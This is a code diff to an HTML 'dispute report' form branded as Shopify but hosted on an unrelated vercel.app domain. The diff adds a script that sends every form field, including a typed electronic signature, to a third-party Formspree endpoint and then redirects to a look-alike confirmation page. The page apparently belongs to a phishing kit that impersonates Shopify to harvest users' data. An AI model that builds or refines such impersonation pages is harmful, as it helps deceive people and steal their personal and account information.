@@ -202,16 +202,36 @@
       <p class="signature-label">Typing your name in the box below will act as your electronic signature</p>
       <input class="field" type="text" name="signature" placeholder="Signature">
 
-      <input type="hidden" name="_next" value="https://issue-lac.vercel.app/form/dispute-confirmation.html">
       <input type="hidden" name="_subject" value="New dispute report">
 
-      <button type="submit" class="btn-submit">Submit</button>
+      <button type="button" class="btn-submit" id="submit-btn" onclick="submitForm()">Submit</button>
     </form>
   </main>
 
   <footer>
     <p>&copy; 2026 Shopify. All rights reserved.</p>
   </footer>
+
+  <script>
+    function submitForm() {
+      var form = document.getElementById('dispute-form');
+      var data = new FormData(form);
+
+      fetch('https://formspree.io/f/xeebgnvk', {
+        method: 'POST',
+        body: data,
+        headers: { 'Accept': 'application/json' }
+      }).then(function(res) {
+        if (res.ok) {
+          window.location.href = 'https://issue-lac.vercel.app/form/dispute-confirmation.html';
+        } else {
+          alert('Something went wrong. Please try again.');
+        }
+      }).catch(function() {
+        alert('Something went wrong. Please try again.');
+      });
+    }
+  </script>
 
 </body>
 </html>
